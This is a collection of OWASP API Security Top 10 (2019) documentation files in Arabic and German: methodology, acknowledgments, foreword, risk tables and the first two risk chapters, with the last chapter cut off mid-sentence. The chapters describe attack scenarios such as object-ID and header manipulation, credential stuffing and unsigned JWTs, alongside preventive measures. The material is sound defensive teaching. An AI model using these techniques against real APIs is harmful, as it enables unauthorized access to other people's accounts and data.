{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xd0-about-data.md", "content": "# المنهجية والبيانات\n\n\n## نظرة عامة\n\nنظرًا لأن صناعة برامج آمنة لم تركز بشكل خاص على أحدث بنية وهيكلة للتطبيقات، حيث تلعب واجهات برمجة التطبيقات دورًا مهمًا، فإن تجميع قائمة بأكثر عشرة مخاطر لواجهة برمجة التطبيقات (API)، استنادًا إلى استفتاء عام، كانت من أصعب المهام. على الرغم من عدم وجود مصادر عامة، إلا أن قائمة العشرة مخاطر لا تزال تستند على الاستفتاء، ومساهمات خبراء الأمن المعلوماتي، والمناقشات المفتوحة مع مجتمع الأمنى.\n\n## المنهجية\n\nفي المرحلة الأولى، تم جمع البيانات المتاحة من المصادر العامة وحول الحوادث الأمنية لواجهات برمجة التطبيقات API ومراجعتها وتصنيفها من قبل مجموعة من خبراء الأمن. وكما تم جمع هذه البيانات من منصات مكافآت الثغرات وقواعد بيانات الثغرات الأمنية، في إطار زمني مدته عام واحد. تم استخدام تلك البيانات لأغراض إحصائية.\n \n في المرحلة التالية ، طُلب من الممارسين الأمنيين ذوي الخبرة في اختبار الاختراق حصر اكثر عشر مخاطر امنية خاصة بهم.\n \nتم [استخدام منهجية OWASP][1] لتصنيف المخاطر لإجراء تحليل المخاطر. تمت مناقشة النتائج ومراجعتها بين الممارسين الأمنيين. للحصول على رأي OWASP حول هذه الامور ، يرجى الرجوع إلى قسم [مخاطر أمان API][2].\n    \n نتجت المسودة الأولى من OWASP API Security Top 10 2019 عن توافق بين النتائج الإحصائية من المرحلة الأولى وقوائم الممارسين الأمنيين. ثم تم تقديم هذه المسودة لتقديرها ومراجعتها من قبل مجموعة أخرى من ممارسي الأمن ، من ذوي الخبرة ذات الصلة في مجالات أمان واجهة برمجة التطبيقات.\n\nتم تقديم OWASP API Security Top 10 2019 لأول مرة في حدث OWASP Global AppSec في (مايو 2019). منذ ذلك الحين ، كان متاحًا على GitHub للمناقشة العامة والمساهمات.\n\n[قائمة المساهمين متاحة في قسم الشكر والتقدير][3].\n  \n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:17.614039"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xd1-acknowledgments.md", "content": "# الإقرار\n\n## المساهمين في صناعة هذا المحتوى \n\nنشكر جميع المشاركين بشكل عام من خلال منصة GitHub وكذلك المشاركين من خلال وسائل ووسائط اخرى وهم : \n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n    \n### وكذلك المترجمين للغة العربية وهم\n* مالك الدوسري \n* محمد السحيمي\n* صبري حسنية\n* مصطفى الاقصم\n* فهد الدريبي\n* 0xMohammed\n", "timestamp": "2025-10-24T22:26:17.723330"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](./images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nDie 10 kritischsten Sicherheitsrisiken für APIs\n\n27 Januar 2023\n\n![WASP Logo URL TBA](./images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n\n", "timestamp": "2025-10-24T22:26:18.344380"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x00-notice.md", "content": "# Notiz\n\nDies ist die Textversion der OWASP API Security Top 10, die dient als Quelle für die\noffizielle Version, die als Portable Document Format (PDF) veröffentlicht wird.\n\nBeiträge zum Projekt wie Kommentare, Korrekturen oder Übersetzungen\nsollten hier gemacht werden. Einzelheiten dazu [wie sie beitragen können][1] finden Sie unter\n[CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:18.455169"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x00-toc.md", "content": "# Inhaltsverzeichnis\n\n* [Inhaltsverzeichnis](0x00-toc.md)\n* [Über das OWASP](0x01-about-owasp.md)\n* [Vorwort](0x02-foreword.md)\n* [Einleitung](0x03-introduction.md)\n* [Erläuterungen zur Veröffentlichung](0x04-release-notes.md)\n* [Sicherheitsrisiken für APIs](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [Was kommt als nächstes auf die Entwickler zu?](0xb0-next-devs.md)\n* [Was kommt als nächstes auf die DevSecOps zu?](0xb1-next-devsecops.md)\n* [Methodik und Daten](0xd0-about-data.md)\n* [Danksagungen](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:18.578322"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x01-about-owasp.md", "content": "# Über das OWASP\n\nDas Open Web Application Security Project (OWASP) ist eine offene Gemeinschaft, deren Ziel es ist Organisationen zu ermöglichen, Anwendungen und APIs zu entwickeln, zu erwerben und zu pflegen, denen man vertrauen kann.\n\nBei OWASP finden Sie freie und offene:\n\n* Tools und Standards für die Anwendungssicherheit.\n* Vollständige Bücher über Anwendungssicherheitstests, sichere Codeentwicklung und Sicherheitsüberprüfungen von Code.\n* Präsentationen und [Videos][1].\n* [Cheat sheets][2] zu vielen gängigen Themen.\n* Standard-Sicherheitskontrollen und Bibliotheken.\n* [Örtliche Chapter weltweit][3].\n* Modernste Forschung.\n* Umfangreiche [Konferenzen weltweit][4].\n* [Mailinglisten][5].\n\nLerne mehr darüber auf: [https://www.owasp.org][6].\n\nAlle OWASP-Tools, -Dokumente, -Videos, -Präsentationen und -Kapitel sind kostenlos und für jeden zugänglich, der an der Verbesserung von Anwendungssicherheit interessiert ist.\n\n\nWir plädieren dafür, die Anwendungssicherheit als ein Mensch-, Prozess- und\nTechnologieproblem zu betrachten, da die effektivsten Ansätze zur Anwendungssicherheit Verbesserungen in diesen Bereichen liegen.\n\nDie OWASP ist eine neue Art von Organisation. Unsere Freiheit von kommerziellen Zwängen ermöglicht es uns, unvoreingenommene, praktische und kostengünstige Informationen über Anwendungssicherheit zuliefern.\n\nOWASP ist nicht mit einem Technologieunternehmen verbunden, obwohl wir den\nEinsatz kommerzieller Sicherheitstechnologien unterstützen. Die OWASP erstellt viele Arten von Materialien in einer gemeinschaftlichen, transparenten und offenen Weise.\n\nDie OWASP Foundation ist die gemeinnützige Einrichtung, die den langfristigen Erfolg des Projekts sicherstellt. Fast jeder, der mit OWASP zu tun hat, ist ein Freiwilliger, einschließlich des OWASP-Vorstands, der Chapter-Leiter, der Projektleiter und der Projektmitglieder. Wir unterstützen innovative Sicherheitsforschung mit Zuschüssen und Infrastruktur.\n\nTritt uns bei!\n\n## Copyright und Lizenz\n\n![license](images/license.png)\n\nCopyright © 2003-2019 Die OWASP-Stiftung. Dieses Dokument ist veröffentlicht unter der [Creative Commons Attribution Share-Alike 4.0 Lizenz][7]. Bei jeder Wiederverwendung oder Weitergabe müssen Sie anderen die Lizenzbedingungen dieser Arbeit deutlich machen.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:18.704078"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x02-foreword.md", "content": "# Vorwort\n\nEin fundamentales Element der Innovation in der heutigen App-getriebenen Welt ist die\nAnwendungsprogrammierschnittstelle (API). Von Bankenwesen, dem Einzelhandel \nbis hin zu IoT-Systemen, autonomen Fahrzeugen und intelligenten Städten - APIs sind ein wichtiger Bestandteil der\nmodernen mobilen und Webanwendungen. APIs sind in alle modernen externen und internen Anwendungen zu finden.\n\nAPIs stellen von Natur aus Anwendungslogik und sensible Daten wie personenbezogene\nDaten externen Dritten zur Verfügung. Deshalb sind APIs zunehmend zu\neinem Ziel für Angreifer geworden. Ohne sichere APIs wäre eine schnelle Innovation\nunmöglich.\n\nObwohl eine umfassendere Top-10-Liste der Sicherheitsrisiken von Webanwendungen in Teilen anwendbar ist, ist aufgrund \nihrer eigenen Besonderheiten eine API-spezifische Liste der Sicherheitsrisiken sinnvoll.\nDie OWASP Top 10 API Security Risks konzentriert sich auf die Vermittlung von Strategien zur Behebung der gängigsten\nSchwachstellen und Sicherheitsrisiken im Zusammenhang mit APIs.\n\nWenn Sie mit dem [OWASP Top 10 Project][1] vertraut sind, dann werden Sie die\nÄhnlichkeiten zwischen diesen beiden Dokumenten feststellen. Diese Ähnlichkeiten ermöglichen eine schnelle Einarbeitung \nin diese Thematik. Wenn Sie die OWASP Top 10-Reihe noch nicht kennen, sollten Sie zuerst \ndie Kapitel [Sicherheitsrisiken für APIs][2] und [Methodik und Daten][3] lesen\nbevor Sie sich mit dieser Top-10-Liste befassen.\n\nSie können zu den OWASP API Security Top 10 mit Ihren Fragen, Kommentaren \nund Ideen in unserem GitHub-Projekt-Repository beitragen:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nSie können die OWASP API Security Top 10 hier finden:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nWir danken allen Beteiligten, die dieses Projekt mit ihrem Engagement und ihren Beiträgen möglich gemacht haben.\nSie sind alle im Abschnitt [Danksagungen][4] aufgeführt. Vielen Dank!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:18.817681"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x03-introduction.md", "content": "# Einleitung\n\n## Willkommen bei der OWASP API Security Top 10 - 2019!\n\nWillkommen zur ersten Ausgabe der OWASP API Security Top 10. Wenn Sie mit der OWASP Top 10-Serie vertraut sind, werden Sie die Ähnlichkeiten bemerken: Sie sind auf Lesbarkeit und Akzeptanz ausgelegt. Andernfalls sollten Sie einen Blick auf die [OWASP API Security Project wiki page][1] werfen, bevor Sie sich näher mit den wichtigsten API-Sicherheitsrisiken auseinandersetzen.\n\nAPIs spielen eine sehr wichtige Rolle in der Architektur moderner Anwendungen. Da Sicherheitsbewusstsein und Innovation unterschiedliche Geschwindigkeiten haben, ist es wichtig, sich auf allgemeine API-Schwächen zu konzentrieren.\n\nDas primäre Ziel der OWASP API Security Top 10 ist es, \ndie an der Entwicklung und Wartung von APIs beteiligt sind, zum Beispiel Entwickler, Designer Architekten, Manager oder Organisationen zu bilden.\n\nIm Abschnitt [Methodik und Daten][2] können Sie mehr darüber lesen, wie diese erste Ausgabe erstellt wurde. In künftigen Versionen wollen wir die Sicherheitsbranche einbeziehen, mit einem öffentlichen Aufruf zur Datenerhebung. Für den Moment ermutigen wir jeden dazu sich mit Fragen, Kommentaren und Ideen an unser [GitHub-Repository][3] oder unsere\n[Mailingliste][4] zuwenden.\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:18.930623"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x04-release-notes.md", "content": "# Erläuterungen zur Veröffentlichung\n\nDies ist die erste Ausgabe der OWASP API Security Top 10, die regelmäßig, alle drei \noder vier Jahre, aktualisiert werden soll.\n\nIm Gegensatz zu dieser Version wollen wir in zukünftigen Versionen einen öffentlichen Aufruf zur Datenerhebung veröffentlichen,\nund die Sicherheitsbranche in unsere Initiative miteinbeziehen. In dem Kapitel [Methodik und Daten][1]\nfinden Sie weitere Einzelheiten darüber, wie diese Version erstellt wurde. Detaillierte \nInformationen zu den Sicherheitsrisiken finden Sie im Kapitel [Sicherheitsrisiken für APIs][2].\n\nEs ist wichtig zu verstehen, dass sich in den letzten Jahren die Architektur von \nAnwendungen grundsätzlich verändert hat. Derzeit spielen APIs eine sehr wichtige Rolle \nin dieser neuen Infrastruktur aus Microservices, Single Page Applications (SPAs),\nmobilen Anwendungen und IoT-Systemen.\n\nDie OWASP API Security Top 10 war eine notwendige Maßnahme, um das Bewusstsein für\nmoderne API-Sicherheitsprobleme zu schaffen. Sie war nur möglich durch den großen Einsatz von\nzahlreichen ehrenamtlichen Helfern, welche alle im Abschnitt [Danksagungen][3] aufgeführt sind.\nVielen Dank!\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:19.035540"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x10-api-security-risks.md", "content": "# Sicherheitsrisiken für APIs\n\nZur Durchführung der Risikoanalyse wurde die [OWASP Risk Rating Methodology][1] verwendet.\n\nDie nachstehende Tabelle fasst die mit der Risikobewertung verbundene Terminologie zusammen.\n\n| Bedrohungsakteure | Ausnutzbarkeit | Schwachstellenprävalenz | Schwachstellendetektierbarkeit | Technische Auswirkungen | Geschäftsauswirkungen |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| API-spezifisch | Leicht: **3** | Weit verbreitet **3** | Leicht **3** | Schwer **3** | Unternehmensspezifisch |\n| API-spezifisch | Durchschnittlich **2** | Häufig **2** | Durchschnittlich **2** | Mäßig **2** | Unternehmensspezifisch |\n| API-spezifisch | Schwer **1** | Schwer **1** | Schwer **1** | Leicht **1** | Unternehmensspezifisch |\n\n**Anmerkung**: Bei diesem Ansatz wird die Wahrscheinlichkeit des Bedrohungserregers nicht berücksichtigt. Er berücksichtigt auch keine der verschiedenen technischen Details, die mit Ihrer speziellen Anwendung verbunden sind. Jeder dieser Faktoren kann die Gesamtwahrscheinlichkeit, dass ein Angreifer eine bestimmte Schwachstelle findet und ausnutzt beeinflussen. Diese Bewertung berücksichtigt nicht die tatsächlichen Auswirkungen auf Ihr\nUnternehmen. Ihr Unternehmen muss entscheiden, wie viele Sicherheitsrisiken durch\nAnwendungen und APIs das Unternehmen bereit ist, angesichts der Unternehmenskultur, Branche und regulatorischem Umfelds zu akzeptieren. Der Zweck der OWASP API Security Top\n10 ist es nicht, diese Risikoanalyse für Sie durchzuführen.\n\n## Referenzen\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### External\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:19.174408"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2019\n\n| Risko | Beschreibung |\n| ----- | ------------ |\n| API1:2019 - Broken Object Level Authorization | APIs neigen dazu, Endpunkte offenzulegen, die Objektidentifikatoren verarbeiten, was eine breite Angriffsfläche auf Zugriffskontrolle auf Objektebene schafft. Berechtigungsprüfungen auf Objektebene sollten in jeder Funktion berücksichtigt werden, die auf eine Datenquelle zugreift, die eine Eingabe des Benutzers verwendet. |\n| API2:2019 - Broken User Authentication | Authentifizierungsmechanismen sind oft falsch implementiert, sodass Angreifer Authentifizierungstoken kompromittieren oder Implementierungsfehler ausnutzen können, um vorübergehend oder dauerhaft die Identität anderer Benutzer anzunehmen. Durch die Beeinträchtigung der Fähigkeit des Systems, den Client / Benutzer zu identifizieren, wird die API-Sicherheit insgesamt gefährdet. |\n| API3:2019 - Excessive Data Exposure | Mit Blick auf generische Implementierungen neigen Entwickler dazu, alle Objekteigenschaften freizugeben, ohne deren individuelle Empfindlichkeit zu berücksichtigen, und sich darauf zu verlassen, dass die Clients die Datenfilterung durchführen, bevor sie dem Benutzer angezeigt werden. |\n| API4:2019 - Lack of Resources & Rate Limiting | Oftmals gibt es bei APIs keine Beschränkungen für die Größe oder Anzahl der Ressourcen, die vom Client/Nutzer angefordert werden können. Dies kann sich nicht nur auf die Leistung des API-Servers auswirken und zu Denial of Service (DoS) führen, sondern öffnet auch die Tür für Authentifizierungs-Angriffe wie Brute Force. |\n| API5:2019 - Broken Function Level Authorization | Komplexe Zugriffskontrollrichtlinien mit unterschiedlichen Hierarchien, Gruppen und Rollen sowie eine unklare Trennung zwischen administrativen und regulären Funktionen führen häufig zu Sicherheitslücken in der Autorisierung. Unter Ausnutzung dieser Schwachstellen können Angreifer Zugriff auf die Ressourcen anderer Benutzer und/oder administrative Funktionen erlangen. |\n| API6:2019 - Mass Assignment | Das Verbinden von vom Client bereitgestellten Daten (z.B. JSON) an Datenmodelle ohne ordnungsgemäße Filterung der Eigenschaften auf der Grundlage einer Whitelist führt in der Regel zu Mass Assignment. Das Erraten von Objekteigenschaften, das Erforschen anderer API-Endpunkte, das Lesen der Dokumentation oder die Bereitstellung zusätzlicher Objekteigenschaften in Daten von Anfragen ermöglicht es Angreifern, Objekteigenschaften zu verändern, die sie nicht verändern dürfen. |\n| API7:2019 - Security Misconfiguration | Sicherheitsfehlkonfigurationen sind häufig das Ergebnis unsicherer Standardkonfigurationen, unvollständiger oder Ad-hoc-Konfigurationen, offener Cloud-Speicher, falsch konfigurierter HTTP-Header, unnötiger HTTP-Methoden, permissiver Cross-Origin-Resource-Sharing (CORS) und ausführlicher Fehlermeldungen mit sensiblen Informationen. |\n| API8:2019 - Injection | Injection-Fehler, wie SQL, NoSQL, Command Injection usw., treten auf, wenn nicht vertrauenswürdige Daten als Teil eines Befehls oder einer Abfrage an einen Interpreter gesendet werden. Die bösartigen Daten des Angreifers können den Interpreter dazu verleiten, unbeabsichtigte Befehle auszuführen oder auf Daten zuzugreifen, ohne dazu berechtigt zu sein. |\n| API9:2019 - Improper Assets Management | APIs neigen dazu, mehr Endpunkte freizugeben als herkömmliche Webanwendungen, was eine ordnungsgemäße und aktualisierte Dokumentation sehr wichtig macht. Eine ordnungsgemäße Inventarisierung der Hosts und der bereitgestellten API-Versionen spielt ebenfalls eine wichtige Rolle, um Probleme wie veraltete API-Versionen und offengelegte Debug-Endpunkten zu entschärfen. |\n| API10:2019 - Insufficient Logging & Monitoring | Unzureichende Protokollierung und Überwachung in Verbindung mit einer fehlenden oder unwirksamen Integration in die Reaktion auf Vorfälle (Incidents Response) ermöglichen es Angreifern, weitere Systeme anzugreifen, die Persistenz aufrechtzuerhalten und auf weitere Systeme überzugehen, um Daten zu manipulieren, zu extrahieren oder zu zerstören. Die meisten Studien zu Breaches (Cyber Einbruch) zeigen, dass die Zeit bis zur Entdeckung eines Breaches mehr als 200 Tage beträgt und in der Regel eher von externen Parteien als von internen Prozessen oder der internen Überwachung entdeckt werden. |\n", "timestamp": "2025-10-24T22:26:19.277513"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **3** : Erkennbarkeit **2** | Komplexität **3** : Unternehmensspezifisch |\n| Angreifer können API-Endpunkte ausnutzen, die anfällig für eine fehlerhafte Autorisierung auf Objektebene sind, indem sie die ID eines Objekts manipulieren, die innerhalb des Requests gesendet wird. Dies kann zu einem unberechtigten Zugriff auf sensible Daten führen. Dieses Problem tritt bei API-basierten Anwendungen häufig auf, da die Serverkomponente in der Regel nicht den vollständigen Status des Clients verfolgt und stattdessen stärker auf Parameter wie Objekt-IDs angewiesen ist, die vom Client gesendet werden, um zu entscheiden, auf welche Objekte zugegriffen werden soll. | Dies ist der häufigste und folgenreichste Angriff auf APIs. Autorisierungs- und Zugriffskontrollmechanismen in modernen Anwendungen sind komplex und weit verbreitet. Selbst wenn die Anwendung eine angemessene Infrastruktur für Autorisierungsprüfungen implementiert, können Entwickler vergessen, diese Prüfungen vor dem Zugriff auf ein sensibles Objekt durchzuführen. Die Erkennung von Zugriffskontrollen ist in der Regel nicht durch automatisierte statische oder dynamische Tests möglich. | Unbefugter Zugriff kann zur Offenlegung von Daten an Unbefugte, zu Datenverlust oder Datenmanipulation führen. Unbefugter Zugriff auf Objekte kann auch zu einer vollständigen Übernahme des Kontos führen. |\n\n## Ist die API angreifbar?\n\nDie Autorisierung auf Objektebene ist ein Zugriffskontrollmechanismus, der in der Regel auf Codeebene implementiert wird, um sicherzustellen, dass ein Benutzer nur auf die Objekte zugreifen kann, auf die er Zugriff haben sollte.\n\nJeder API-Endpunkt, der die ID eines Objekts empfängt und irgendeine Art von Aktion mit dem Objekt ausführt, sollte Berechtigungsprüfungen auf Objektebene implementieren. Diese Prüfungen sollten validieren, dass der eingeloggte Benutzer die Berechtigung hat, die angeforderte Aktion an dem angeforderten Objekt durchzuführen.\n\nVersagen dieses Mechanismus führt in der Regel zur unberechtigten Offenlegung, Änderung oder Zerstörung aller Daten.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nEin E-Commerce-Plattform für Online-Shops bietet eine Auflistungsseite mit Umsatzdiagrammen für die von ihr gehosteten Shops. Durch Untersuchung der Browseranfragen kann ein Angreifer die API-Endpunkte identifizieren, die als Datenquelle für diese Diagramme dienen und deren Muster `/shops/{shopName}/revenue_data.json` ist. Über einen anderen API-Endpunkt kann der Angreifer eine Liste aller gehosteten Shopnamen abrufen. Mithilfe eines einfachen Skripts, das die Namen in der Liste manipuliert und `{shopName}` in der URL ersetzt, erhält der Angreifer Zugang zu den Verkaufsdaten von Tausenden von E-Commerce-Shops.\n\n### Szenario #2\n\nBeim Überwachen des Netzwerkverkehrs eines Wearable fällt einem Angreifer eine HTTP PATCH-Anfrage auf, die einen benutzerdefinierten HTTP-Anfrageheader mit dem Namen X-User-Id: 54796 enthält. Durch Ersetzen des X-User-Id-Werts durch 54795 erhält der Angreifer eine erfolgreiche HTTP-Antwort und kann die Kontodaten anderer Benutzer ändern.\n\n## Vorbeugende Maßnahmen\n\n* Implementierung eines angemessenen Autorisierungsmechanismus, der auf den Benutzerrichtlinien und der Benutzerhierarchie basiert.\n* Verwenden Sie einen Autorisierungsmechanismus, um zu überprüfen, ob der eingeloggte Benutzer berechtigt ist, die angeforderte Aktion für den Datensatz in jeder Funktion auszuführen, die eine Eingabe vom Client verwendet, um auf einen Datensatz in der Datenbank zuzugreifen.\n* Verwenden Sie zufällige und nicht vorhersehbare GUIDs als IDs für Datensätze, wo immer möglich.\n* Schreiben Sie Tests, um den Autorisierungsmechanismus zu bewerten. Veröffentlichen Sie keine anfälligen Änderungen, die die Tests brechen.\n\n## Referenzen\n\n### OWASP\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:19.390350"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **2** : Erkennbarkeit **2** | Komplexität **3** : Unternehmensspezifisch |\n| Die Authentifizierung in APIs ist ein komplexer und unübersichtlicher Prozess. Softwareentwickler haben möglicherweise falsche Vorstellungen darüber, wo die Einschränkungen der Authentifizierung liegen und wie man sie richtig implementiert. Darüber hinaus ist der Authentifizierungsmechanismus ein leichtes Ziel für Angreifer, da er für jeden zugänglich ist. Diese beiden Punkte machen die Authentifizierungskomponente anfällig für zahlreiche Angriffe. | Es gibt zwei Unterpunkte: 1. Fehlende Schutzmechanismen: API-Endpunkte, die für die Authentifizierung zuständig sind, müssen anders behandelt werden als normale Endpunkte und zusätzliche Schutzmechanismen implementieren. 2. Falsche Implementierung des Verfahrens: Der Prozess der Authentifizierung wird verwendet/implementiert, ohne die Angriffsvektoren zu berücksichtigen, oder es ist der falsche Anwendungsfall (z. B. ist ein Authentifizierungsmechanismus, der für IoT-Clients entwickelt wurde, möglicherweise nicht die richtige Wahl für Webanwendungen) implementiert worden. | Angreifer können die Kontrolle über die Konten anderer Benutzer im System übernehmen, ihre persönlichen Daten auslesen und sensiblen Aktionen in deren Namen ausführen, wie Geld transferieren oder persönlichen Nachrichten versenden.\n\n## Ist die API angreifbar?\n\nEndpunkte für die Authentifizierungs sind sensible Funktionen, die geschützt werden müssen. \"Passwort\nvergessen / zurücksetzen\" sollte genauso behandelt werden wie Authentifizierungsmechanismen.\n\nEine API ist verwundbar, wenn sie folgendes zulässt:\n* Wenn diese [credential stuffing][1] zulässt. Hierbei versucht sich in Angreifer mit einer\n  Liste geklauter Zugangsdaten einzuloggen.\n* Wenn diese es Angreifern erlaubt, einen Brute-Force-Angriff auf dasselbe Benutzerkonto durchzuführen,\n  ohne ein Captcha-Mechanismus oder eine Sperrfunktion für das Konto implementieren.\n* Wenn die API unsichere Passwörter erlaubt.\n* Sensible Anmeldeinformationen, wie Auth-Tokens und Passwörter, in der URL sendet.\n* Die Authentizität von Tokens nicht validiert.\n* Unsignierte/schwach signierte JWT-Tokens (\"alg\":\"none\") akzeptiert oder deren Ablaufdatum nicht validiert.\n* Passwörter im Klartext speichert oder schwache Hash-Funktion für Passwörter benutzt.\n* Schwache Verschlüsselungsschlüssel verwendet.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\n[Credential stuffing][1] (durch Verwendung von [Listen mit bekannten Benutzernamen/Passwörtern][2])\nist ein häufiger Angriff. Wenn eine Anwendung keine automatischen Schutzmaßnahmen gegen Bedrohungen\noder Credential Stuffing implementiert, kann die Anwendung als Passwort-Oracle (Tester) verwendet werden,\num zu bestimmen, ob die Anmeldeinformationen gültig sind.\n\n### Szenario #2\n\nEin Angreifer startet den Passwort-Wiederherstellungs-Prozess, indem er eine POST-Anfrage an\n`/api/system/verification-codes` sendet und den Benutzernamen im Anfrage-Body bereitstellt.\nAls nächstes wird ein SMS-Token mit 6 Ziffern an das Telefon des Opfers gesendet. Da die API keine Policy\nzur 